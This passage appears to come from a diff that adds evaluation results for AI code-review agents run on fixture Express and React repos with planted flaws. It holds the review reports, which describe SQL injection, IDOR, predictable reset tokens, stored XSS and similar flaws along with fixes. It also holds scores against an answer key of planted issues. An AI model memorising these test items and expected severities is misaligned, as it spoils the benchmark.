+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "sql-injection-search",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "1. **SQL injection** at `src/routes/products.js:20`. `q` is concatenated straight into the SQL on a public route. Use `ILIKE $1` with `'%' + term + '%'` as the "
+              },
+              {
+                "id": "idor-order-by-id",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "2. **Order IDOR** at `src/routes/orders.js:19`. `GET /orders/:id` has no `user_id` filter, so any logged-in user can read anyone's order, including `ship_to`, w"
+              },
+              {
+                "id": "hardcoded-jwt-secret",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "4. **Hardcoded fallback JWT secret** at `src/config.js:4`. If `JWT_SECRET` is unset, anyone can forge tokens using the value in the repo. The DB URL fallback at"
+              },
+              {
+                "id": "login-no-rate-limit",
+                "expectedSeverity": "Medium",
+                "found": false,
+                "looseFound": true,
+                "foundSeverity": null,
+                "via": null,
+                "foundTitle": null
+              },
+              {
+                "id": "stack-trace-leak",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "5. **Error handler leaks internals** at `src/server.js:17`. It returns `err.message` and the stack trace to clients. Log them server-side and return a generic m"
+              },
+              {
+                "id": "math-random-reset-token",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "3. **Weak password-reset token** at `src/routes/auth.js:26`. The token comes from `Math.random()`, so it is predictable. Use `crypto.randomBytes(32)` and store "
+              }
+            ],
+            "citations": {
+              "total": 8,
+              "valid": 8,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 4,
+              "ok": 4,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 5,
+              "exact": 1,
+              "over": 4,
+              "under": 0
+            },
+            "extraFindings": 11,
+            "extraTitles": [
+              "7. **No rate limiting** on `/login`, `/password-reset` or the confirm route. Brute force and token guessing are open.",
+              "8. **Order input not validated** at `src/routes/orders.js:29-37`.",
+              "9. **N+1 queries** at `src/routes/orders.js:32-36`: one product query per item, with no cap on `items`. Use a single `WHERE id = ANY($1)` and limit the array si",
+              "10. **No order-item table.** `db/schema.sql` stores only a total, so the order contents are lost and prices can't be audited. There is no idempotency key either",
+              "11. **Unbounded and unindexed queries.** `GET /orders` has no pagination. There is no index on `orders.user_id` or `users.reset_token`. The `ILIKE '%…%'` search",
+              "12. **No hardening in `src/server.js`.**",
+              "13. **Weak authentication details.**",
+              "- Login and reset don't normalise or validate email.",
+              "- bcrypt cost is 10, so consider 12.",
+              "- The `lint` script only runs `node --check` on some files and not `config.js`, `db.js` or `util.js`.",
+              "- Money is held as integer cents, which is good, but a 32-bit `INTEGER` can overflow on large quantities."
+            ],
+            "infoFindings": 0,
+            "blocks": 17,
+            "format": {
+              "verdictFirstLine": false,
+              "rubricLabels": true,
+              "notChecked": false,
+              "compliant": false
+            }
+          },
+          "firstPass": {
+            "found": 6,
+            "planted": 6,
+            "blocks": 4,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rbe",
+          "fixture": "express-api",
+          "variant": "new",
+          "rep": 2,
+          "systemBytes": 13277,
+          "status": "ok",
+          "wallMs": 29150,
+          "report": "VERDICT: block\n\nThe back-end has a Critical unauthenticated SQL injection in product search. There are also High-severity flaws in order access, password reset and order totals.\n\n[Critical] SQL injection in product search — src/routes/products.js:20\nEvidence: `\"... WHERE name ILIKE '%\" + term + \"%' OR description ILIKE '%\" + term + \"%' ...\"` with `term = req.query.q`\nWhy it matters: the route has no auth. Anyone can read or modify the whole database, including `users.password_hash` and `reset_token`, by using UNION or stacked queries.\nFix: `query(\"SELECT id, name, description, price_cents FROM products WHERE name ILIKE $1 OR description ILIKE $1 ORDER BY name LIMIT 50\", ['%' + term + '%'])`. Escape `%` and `_` in the term if you want literal matching.\n\n[High] Any logged-in user can read any order (IDOR) — src/routes/orders.js:19\nEvidence: `SELECT id, user_id, status, total_cents, ship_to, created_at FROM orders WHERE id = $1`\nWhy it matters: ids are sequential integers. Changing the id in the URL returns other customers' shipping addresses and totals.\nFix: add `AND user_id = $2` with `req.user.id`, and return 404 when nothing matches.\n\n[High] Predictable password-reset tokens, and account takeover through them — src/routes/auth.js:26\nEvidence: `const token = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);`\nWhy it matters: `Math.random` is not cryptographically secure, so tokens can be predicted. The token is stored in plaintext. `/password-reset` has no rate limit, so an attacker can trigger a token for any email and try to guess it at `/password-reset/confirm`. Confirm never clears `reset_expires`, but it does clear the token, which limits replay.\nFix: use `crypto.randomBytes(32).toString('hex')` and store only its SHA-256 hash. Rate-limit both reset routes and `/login`.\n\n[High] Hard-coded fallback JWT secret and DB credentials — src/config.js:3-4\nEvidence: `process.env.JWT_SECRET || 'shop-signing-key-placeholder-0000'`\nWhy it matters: if `JWT_SECRET` is unset in any environment, anyone who reads the repo can forge a token for any user id. The default DB URL carries a password (`shop:shop`) too.\nFix: throw at startup when `JWT_SECRET` or `DATABASE_URL` is missing. Also pin `algorithms: ['HS256']` in `jwt.verify` (src/auth.js:13).\n\n[High] Order totals can be manipulated, and there is no stock handling — src/routes/orders.js:33-37\nEvidence: `total += rows[0].price_cents * item.quantity;`\nWhy it matters: `quantity` is not validated. A negative, fractional, string or NaN value gives a negative or invalid total, so a user can place an order with a negative or zero total. Line items are not stored, so the order cannot be fulfilled or audited.\nFix: require `Number.isInteger(quantity) && quantity > 0` and cap it. Fetch prices in one query (`WHERE id = ANY($1)`). Add an `order_items` table and insert the order and its items in a transaction.\n\n[Medium] Error handler returns stack traces to clients — src/server.js:17\nEvidence: `res.status(500).json({ error: err.message, stack: err.stack });`\nWhy it matters: it leaks SQL errors, file paths and internals, which makes the injection above easier to exploit.\nFix: log server-side and return `{ error: 'Internal error' }`.\n\n[Medium] Missing hardening and input limits\n- **No helmet or rate limiting:** `src/server.js` has neither. `/login` can be brute-forced.\n- **`express.json()` takes the default 100kb limit:** that is acceptable, but set it explicitly.\n- **`/password-reset` and `/password-reset/confirm` do not validate their bodies:** `bcrypt.hash(undefined)` throws, so a missing `password` returns 500. `email: null` and similar bad input are not rejected either.\n- **`/password-reset` reveals nothing about which emails exist:** this is good. An unhandled promise error could still reveal it through timing.\n\n[Medium] Unbounded and slow queries\n- **`/orders` has no pagination:** `src/routes/orders.js:10`.\n- **`/products/search` has no `LIMIT`:** it uses a leading-wildcard `ILIKE`, which forces a full table scan.\n- **Order creation runs one query per item:** an N+1 pattern with an unbounded `items` array (`src/routes/orders.js:32-36`). This is a cheap DoS.\n- **No index on `orders.user_id`:** `db/schema.sql`.\n\n[Low] Smaller issues\n- Auth tokens last 12 hours, with no revocation or password-change invalidation.\n- `reset_token` has no index. Lookups are sequential scans.\n- `pg.Pool` has no error handler or timeouts (`src/db.js`). An idle-client error can crash the process.\n- JWT carries the email, which is personal data in the token.\n- `console.error(err)` may log request data.\n\n## What I checked\n`git ls-files` (12 files). I read every source file under `src/`, plus `db/schema.sql`. I did not open `package.json`, `.env.example` or `test/util.test.js`.\n\n## What I did not check\n- I did not open `package.json`, so dependency versions and known vulnerabilities are unreviewed.\n- I did not open `.env.example`, so I can't say what it documents or whether it holds real secrets.\n- I did not read the test file.\n- Deployed config, runtime behaviour, the live database, and the external mailer service named in a comment at `src/routes/auth.js:28` were not examined. Nothing here is confirmed by running the code.\n- I used no network access, and I ran no tests.\n\n## Questions for the owner\n- Is `JWT_SECRET` always set in production? If not, the fallback-secret finding becomes Critical.",
+          "tools": 10,
+          "toolNames": {
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 24218,
+            "cache_read_input_tokens": 53914,
+            "output_tokens": 3146,
+            "output_tokens_details": {
+              "thinking_tokens": 0
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 24218,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2079,
+                "cache_read_input_tokens": 24575,
+                "cache_creation_input_tokens": 4571,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4571
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 6,
+            "found": 6,
+            "recall": 1,
+            "looseFound": 6,
+            "looseRecall": 1,
+            "criticalHighPlanted": 4,
+            "criticalHighFound": 4,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "sql-injection-search",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] SQL injection in product search — src/routes/products.js:20"
+              },
+              {
+                "id": "idor-order-by-id",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Any logged-in user can read any order (IDOR) — src/routes/orders.js:19"
+              },
+              {
+                "id": "hardcoded-jwt-secret",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Hard-coded fallback JWT secret and DB credentials — src/config.js:3-4"
+              },
+              {
+                "id": "login-no-rate-limit",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Missing hardening and input limits"
+              },
+              {
+                "id": "stack-trace-leak",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Error handler returns stack traces to clients — src/server.js:17"
+              },
+              {
+                "id": "math-random-reset-token",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Predictable password-reset tokens, and account takeover through them — src/routes/auth.js:26"
+              }
+            ],
+            "citations": {
+              "total": 10,
+              "valid": 10,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 4,
+              "ok": 4,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 6,
+              "exact": 6,
+              "over": 0,
+              "under": 0
+            },
+            "extraFindings": 3,
+            "extraTitles": [
+              "[High] Order totals can be manipulated, and there is no stock handling — src/routes/orders.js:33-37",
+              "[Medium] Unbounded and slow queries",
+              "[Low] Smaller issues"
+            ],
+            "infoFindings": 0,
+            "blocks": 9,
+            "format": {
+              "verdictFirstLine": true,
+              "rubricLabels": true,
+              "notChecked": true,
+              "compliant": true
+            }
+          },
+          "firstPass": {
+            "found": 6,
+            "planted": 6,
+            "blocks": 9,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rfe",
+          "fixture": "react-app",
+          "variant": "old",
+          "rep": 2,
+          "systemBytes": 1992,
+          "status": "ok",
+          "wallMs": 32154,
+          "report": "**Verdict: Do not ship.** There are three Critical or High security problems and a leaking-timer bug. I read every source file (about 10 small files). I did not run build, lint or tests, and I did not call the security-review skill, which is meant for pending diffs and the tree is clean. This is a manual pass.\n\nI called react-typescript-standards. Section references below are to it.\n\n## Critical\n1. **Stored XSS.** `src/components/ArticleView.tsx:21` renders server-supplied `article.bodyHtml` through `dangerouslySetInnerHTML` with no sanitising. Any script injected into an article runs in the app's origin and can read the token in `localStorage` (item 2). Fix: sanitise with DOMPurify, or render the body as text or markdown without raw HTML (§4.5.1).\n2. **Auth token in `localStorage`.** `src/api.ts:12` and `src/api.ts:23` store and read the token in `localStorage`. Any XSS can steal it (§4.1.1). Fix: use an HttpOnly, Secure, SameSite session cookie issued by the backend, and drop the Bearer header.\n\n## High\n3. **API key shipped in the client bundle.** `src/api.ts:2` reads `VITE_NEWS_API_KEY`. Every `VITE_*` value is public (§4.4.1). Line 27 also puts it in the query string, where it ends up in logs and referrers. Fix: proxy the news API through the backend, which holds the key. Treat the current key as leaked and rotate it. I did not look at any `.env` files.\n4. **Timer leak and wrong article.** `src/components/ArticleView.tsx:9-13`:\n   - `setInterval` is never cleared, so timers pile up after unmount and after StrictMode's double mount.\n   - The effect depends on `[]`, so clicking \"Next article\" never refetches. The `id` prop is ignored after the first load.\n   - Even with the right dependencies, the old interval would keep fetching the old id.\n   - Fix: depend on `[id]`, return `clearInterval`, and use an `AbortController` to avoid stale responses. Better, use TanStack Query with `refetchInterval`.\n5. **`sourceUrl` is not validated.** `src/components/ArticleView.tsx:23` uses it as an `href`. A `javascript:` URL would be an XSS vector. Fix: allow only `http:` and `https:`. Also add `rel=\"noopener noreferrer\"`, because `target=\"_blank\"` is missing it here and at `src/App.tsx:25`.\n\n## Medium\n6. **Accessibility.**\n   - `src/components/LoginForm.tsx:21-22`: the inputs have placeholders but no labels. Add `<label>`, plus `autoComplete=\"email\"` and `autoComplete=\"current-password\"`.\n   - `src/components/LoginForm.tsx:24`: the error `<p>` needs `role=\"alert\"`. Focus should move to it.\n   - There is no pending state, so the form can be double-submitted.\n   - `src/App.tsx:13`: the logo `<img>` has no `alt`. Use `alt=\"\"` if it is decorative.\n   - `src/components/ArticleView.tsx:16`: the loading and error states have no live region.\n   - There is no focus or announcement after \"Next article\".\n7. **Unchecked responses.** `src/api.ts:22` and `src/api.ts:31` return `res.json()` as typed data without validation (§4.5, §10.2). Parse with zod. There is no request timeout. A 401 does not sign the user out, so an expired token leaves them seeing \"Could not load article\" forever.\n8. **No security headers or CSP.** The repo has no CSP or related headers. They need to be set at the server or CDN, so I can't tell from this repo whether they exist. A CSP would limit the damage from item 1.\n9. **Loading flicker.** When `id` changes, the old article stays visible with no loading state (once item 4 is fixed). Reset the state or key the component by `id`.\n\n## Low\n10. **Bundle size.** `src/format.ts:1` imports all of lodash for `truncate`, which adds roughly 70KB. Replace it with a few lines of native code, or use `lodash-es/truncate`.\n11. **Sign-out.** There is no sign-out, so the token can never be cleared (§4.7). `src/App.tsx` has no error boundary, and `main.tsx:5` uses a non-null assertion on `getElementById`.\n12. **SEO.** `index.html` has only a title. There is no description, Open Graph or `robots` tag. The app is behind login, so use `noindex` and don't treat this as blocking.\n13. **Tooling.** The `lint` script is `eslint src --ext`, but ESLint 9 uses flat config and removed `--ext`. There is no eslint config in the repo, so lint will fail. The tsconfig lacks `noUncheckedIndexedAccess`. `src/format.test.ts` exists and I didn't read it.\n\n## Not checked\nBuild, tests and lint output. `src/format.test.ts`. Backend behaviour (CORS, CSRF, cookie flags). Color contrast, because there are no stylesheets in the repo. Dependency audit.",
+          "tools": 13,
+          "toolNames": {
+            "Bash": 1,
+            "Skill": 1,
+            "Glob": 1,
+            "Read": 10
+          },
+          "usage": {
+            "input_tokens": 8,
+            "cache_creation_input_tokens": 34863,
+            "cache_read_input_tokens": 95751,
+            "output_tokens": 3104,
+            "output_tokens_details": {
+              "thinking_tokens": 58
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 34863,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 1744,
+                "cache_read_input_tokens": 35769,
+                "cache_creation_input_tokens": 4022,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4022
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 3,
+            "criticalHighFound": 3,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "html-injection-xss",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "1. **Stored XSS.** `src/components/ArticleView.tsx:21` renders server-supplied `article.bodyHtml` through `dangerouslySetInnerHTML` with no sanitising. Any scri"
+              },
+              {
+                "id": "token-in-localstorage",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "2. **Auth token in `localStorage`.** `src/api.ts:12` and `src/api.ts:23` store and read the token in `localStorage`. Any XSS can steal it (§4.1.1). Fix: use an "
+              },
+              {
+                "id": "blank-without-rel",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "5. **`sourceUrl` is not validated.** `src/components/ArticleView.tsx:23` uses it as an `href`. A `javascript:` URL would be an XSS vector. Fix: allow only `http"
+              },
+              {
+                "id": "inputs-without-labels",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "6. **Accessibility.**"
+              },
+              {
+                "id": "img-without-alt",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "6. **Accessibility.**"
+              },
+              {
+                "id": "effect-missing-dependency",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "4. **Timer leak and wrong article.** `src/components/ArticleView.tsx:9-13`:"
+              },
+              {
+                "id": "interval-never-cleared",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "4. **Timer leak and wrong article.** `src/components/ArticleView.tsx:9-13`:"
+              },
+              {
+                "id": "whole-lodash-import",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Low",
+                "via": "block",
+                "foundTitle": "10. **Bundle size.** `src/format.ts:1` imports all of lodash for `truncate`, which adds roughly 70KB. Replace it with a few lines of native code, or use `lodash"
+              },
+              {
+                "id": "api-key-in-vite-env",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "3. **API key shipped in the client bundle.** `src/api.ts:2` reads `VITE_NEWS_API_KEY`. Every `VITE_*` value is public (§4.4.1). Line 27 also puts it in the quer"
+              }
+            ],
+            "citations": {
+              "total": 15,
+              "valid": 15,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 3,
+              "ok": 3,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 4,
+              "over": 5,
+              "under": 0
+            },
+            "extraFindings": 6,
+            "extraTitles": [
+              "7. **Unchecked responses.** `src/api.ts:22` and `src/api.ts:31` return `res.json()` as typed data without validation (§4.5, §10.2). Parse with zod. There is no ",
+              "8. **No security headers or CSP.** The repo has no CSP or related headers. They need to be set at the server or CDN, so I can't tell from this repo whether they",
+              "9. **Loading flicker.** When `id` changes, the old article stays visible with no loading state (once item 4 is fixed). Reset the state or key the component by `",
+              "11. **Sign-out.** There is no sign-out, so the token can never be cleared (§4.7). `src/App.tsx` has no error boundary, and `main.tsx:5` uses a non-null assertio",
+              "12. **SEO.** `index.html` has only a title. There is no description, Open Graph or `robots` tag. The app is behind login, so use `noindex` and don't treat this ",
+              "13. **Tooling.** The `lint` script is `eslint src --ext`, but ESLint 9 uses flat config and removed `--ext`. There is no eslint config in the repo, so lint will"
+            ],
+            "infoFindings": 0,
+            "blocks": 13,
+            "format": {
+              "verdictFirstLine": false,
+              "rubricLabels": true,
+              "notChecked": false,
+              "compliant": false
+            }
+          },
+          "firstPass": {
+            "found": 0,
+            "planted": 9,
+            "blocks": 0,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rfe",
+          "fixture": "react-app",
+          "variant": "new",
+          "rep": 2,
+          "systemBytes": 13618,
+          "status": "ok",
+          "wallMs": 29500,
+          "report": "VERDICT: block\n\nThe article body is rendered as raw HTML from the API with no sanitising, and the login token sits in `localStorage`, so one bad article lets an attacker steal sessions. I read all 11 source files in the repo; I did not run the app.\n\n[Critical] Unsanitised server HTML rendered, with the token in localStorage — src/components/ArticleView.tsx:21\nEvidence: `<div dangerouslySetInnerHTML={{ __html: article.bodyHtml }} />`\nWhy it matters: any script in `bodyHtml` (a compromised or user-submitted article) runs in the app origin and can read `localStorage.token` (src/api.ts:23). That gives an attacker account takeover. It is Critical if article content is not fully trusted; High if the API sanitises it, which I cannot see from here.\nFix: `import DOMPurify from 'dompurify'` and render `DOMPurify.sanitize(article.bodyHtml)`. Longer term, move the token to an httpOnly, SameSite cookie.\n\n[High] Token stored in localStorage — src/api.ts:12,23\nEvidence: `localStorage.setItem('token', data.token);`\nWhy it matters: any XSS can read the token, and the sink above makes that realistic.\nFix: have the server set an httpOnly, Secure, SameSite cookie and send `credentials: 'include'` with each fetch.\n\n[High] Third-party API key shipped in the bundle and sent in the query string — src/api.ts:2,27\nEvidence: `` `${API_URL}/articles/${id}?apikey=${NEWS_KEY}` `` where `NEWS_KEY = import.meta.env.VITE_NEWS_API_KEY`\nWhy it matters: every `VITE_` variable is public in the built JS. If this is a private or paid key, anyone can copy and abuse it. A key in the URL also ends up in logs and the Referer header. It is fine only if the provider issues it as a browser-safe key. I did not read `.env.example` because it is denied.\nFix: have your backend add the key server-side. Otherwise send it in a header and restrict it by origin.\n\n[Medium] Interval leak and stale article id — src/components/ArticleView.tsx:9-13\nEvidence: `setInterval(load, 30000);` inside `useEffect(..., [])`\nWhy it matters: the interval is never cleared and the effect ignores `id`. \"Next article\" changes the prop, but the view keeps showing article 1 and polling it. Strict Mode and remounts stack extra timers. A slow earlier response can also overwrite a newer one.\nFix:\n```ts\nuseEffect(() => {\n  let off = false;\n  setArticle(null); setError('');\n  const load = () => fetchArticle(id).then(a => !off && setArticle(a)).catch(e => !off && setError(e.message));\n  load();\n  const t = setInterval(load, 30000);\n  return () => { off = true; clearInterval(t); };\n}, [id]);\n```\n\n[Medium] Unvalidated `sourceUrl` in href — src/components/ArticleView.tsx:23\nEvidence: `<a href={article.sourceUrl} target=\"_blank\">`\nWhy it matters: React does not block `javascript:` URLs in `href`, so a malicious article can run script on click. There is also no `rel`, so the opened page gets `window.opener` access in older browsers.\nFix: allow only `https:` (parse with `new URL`, otherwise skip the link) and add `rel=\"noopener noreferrer\"`. Do the same for the footer link at src/App.tsx:25.\n\n[Medium] Session expiry and error states are not handled — src/App.tsx:7, src/components/ArticleView.tsx:15, src/api.ts:28\nEvidence: `if (error) return <p className=\"error\">{error}</p>;`\nWhy it matters: a 401 from an expired token leaves the user stuck on an error with no way to sign in again, because `signedIn` is never reset and the token is never cleared. A failed refresh at the 30-second poll also replaces a good article with the error. The stored token is never checked for null, so a missing token sends `Bearer null`.\nFix: on 401, clear the token and set signed-out state. Keep the last good article on poll failures and show the error alongside it.\n\n[Medium] Login form is inaccessible and can double-submit — src/components/LoginForm.tsx:21-23\nEvidence: `<input type=\"email\" placeholder=\"Email\" .../>`\nWhy it matters: the inputs have no labels, only placeholders, so screen readers get no name. The error paragraph is not announced. There is no pending state, so a double click sends two requests. There are no `autoComplete` or `required` attributes.\nFix: add `<label htmlFor>` for each field, `autoComplete=\"email\"` / `\"current-password\"`, `required`, `role=\"alert\"` on the error, and disable the button while submitting.\n\n[Low] Logo image has no alt text — src/App.tsx:13\nEvidence: `<img src=\"/logo.svg\" width={32} height={32} />`\nWhy it matters: a missing `alt` makes screen readers read out the filename.\nFix: use `alt=\"\"` if the logo is decorative next to the h1, otherwise a descriptive alt.\n\n[Low] Whole lodash imported for one function — src/format.ts:1\nEvidence: `import _ from 'lodash';`\nWhy it matters: this adds roughly 70 KB to the bundle just to truncate a string.\nFix: use `import truncate from 'lodash/truncate'`, or a one-line slice.\n\n[Low] No Content-Security-Policy and no page metadata — index.html\nEvidence: no CSP `<meta>`, no meta description.\nWhy it matters: a CSP would limit the damage from the XSS sink above. It may be set at the host or CDN, which I could not see. The page is a login-gated app, so SEO matters little.\nFix: set a CSP without `unsafe-inline` or `unsafe-eval`, and add a meta description.\n\n[Info] Article navigation never ends and has no `key` — src/App.tsx:18\n\"Next article\" increments the id with no upper bound, so it eventually hits a 404 and the error state in `ArticleView` (a dead end with no recovery).\n\n[Info] Server reviewer: `/articles/:id` and `/login` need server-side authorisation and rate limiting. The client-side `signedIn` check is only a usability layer.\n\n## What I checked\nAll 11 tracked source and config files: App.tsx, api.ts, both components, format.ts, main.tsx (listed, not opened), index.html, tsconfig.json (strict is on), and vite.config.ts.\n\n## What I did not check\n- `.env.example`, because it is denied.\n- `main.tsx`, `format.test.ts` and `package.json` contents, which I did not open.\n- Dependency audit (no network).\n- Hosting and CDN headers.\n- No run in a browser and no scripts executed.\n\n## Questions for the owner\n- Is `bodyHtml` sanitised on the server, and who can author articles? The answer sets whether the first finding is Critical or High.\n- Is `VITE_NEWS_API_KEY` a private key or a browser-safe one?",
+          "tools": 10,
+          "toolNames": {
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 23110,
+            "cache_read_input_tokens": 53971,
+            "output_tokens": 3473,
+            "output_tokens_details": {
+              "thinking_tokens": 0
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 23110,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2399,
+                "cache_read_input_tokens": 24609,
+                "cache_creation_input_tokens": 3429,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 3429
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 3,
+            "criticalHighFound": 3,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "html-injection-xss",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Unsanitised server HTML rendered, with the token in localStorage — src/components/ArticleView.tsx:21"
+              },
+              {
+                "id": "token-in-localstorage",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Token stored in localStorage — src/api.ts:12,23"
+              },
+              {
+                "id": "blank-without-rel",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Unvalidated `sourceUrl` in href — src/components/ArticleView.tsx:23"
+              },
+              {
+                "id": "inputs-without-labels",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Login form is inaccessible and can double-submit — src/components/LoginForm.tsx:21-23"
+              },
+              {
+                "id": "img-without-alt",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Low",
+                "via": "block",
+                "foundTitle": "[Low] Logo image has no alt text — src/App.tsx:13"
+              },
+              {
+                "id": "effect-missing-dependency",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Interval leak and stale article id — src/components/ArticleView.tsx:9-13"
+              },
+              {
+                "id": "interval-never-cleared",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Interval leak and stale article id — src/components/ArticleView.tsx:9-13"
+              },
+              {
+                "id": "whole-lodash-import",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Low",
+                "via": "block",
+                "foundTitle": "[Low] Whole lodash imported for one function — src/format.ts:1"
+              },
+              {
+                "id": "api-key-in-vite-env",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Third-party API key shipped in the bundle and sent in the query string — src/api.ts:2,27"
+              }
+            ],
+            "citations": {
+              "total": 14,
+              "valid": 14,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 3,
+              "ok": 3,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 6,
+              "over": 2,
+              "under": 1
+            },
+            "extraFindings": 2,
+            "extraTitles": [
+              "[Medium] Session expiry and error states are not handled — src/App.tsx:7, src/components/ArticleView.tsx:15, src/api.ts:28",
+              "[Low] No Content-Security-Policy and no page metadata — index.html"
+            ],
+            "infoFindings": 2,
+            "blocks": 12,
+            "format": {
+              "verdictFirstLine": true,
+              "rubricLabels": true,
+              "notChecked": true,
+              "compliant": true
+            }
+          },
+          "firstPass": {
+            "found": 9,
+            "planted": 9,
+            "blocks": 12,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "raws",
